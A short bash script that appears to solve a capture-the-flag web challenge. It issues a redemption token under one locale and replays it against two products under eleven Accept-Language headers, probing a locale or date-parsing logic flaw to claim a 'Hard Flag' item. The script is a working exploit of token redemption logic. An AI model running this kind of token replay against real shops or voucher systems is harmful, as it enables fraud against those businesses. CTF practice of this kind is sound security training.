#!/usr/bin/env bash
set -euo pipefail

# 1) See products for check
curl -s 'https://d055ed10-071d-4fff-828d-422d8a288c2a.chall.nnsc.tf/products' | jq

# 2) Issue a token in en-US (SHORT date like M/d/yy)
TOKEN="$(
  curl -s -X POST 'https://d055ed10-071d-4fff-828d-422d8a288c2a.chall.nnsc.tf/tokens' \
    -H 'Accept-Language: en-US' | jq -r .token
)"
printf '%s\n' "$TOKEN" > /tmp/token
echo "Token saved to /tmp/token"

# 3) Try to redeem the same token under different locales
#    Test both product 2 (Tablet) and product 3 (Hard Flag)
for ID in 2 3; do
  for L in zh-CN zh-TW ko-KR ja-JP th-TH fa-IR hi-IN id-ID en-GB de-DE fr-FR; do
    echo "Trying product $ID with locale $L..."
    curl -s -X POST "https://d055ed10-071d-4fff-828d-422d8a288c2a.chall.nnsc.tf/products/$ID" \
      -H "Accept-Language: $L" \
      -H "Content-Type: application/json" \
      --data "{\"token\":\"$TOKEN\"}" | jq .
    echo "----"
  done
done
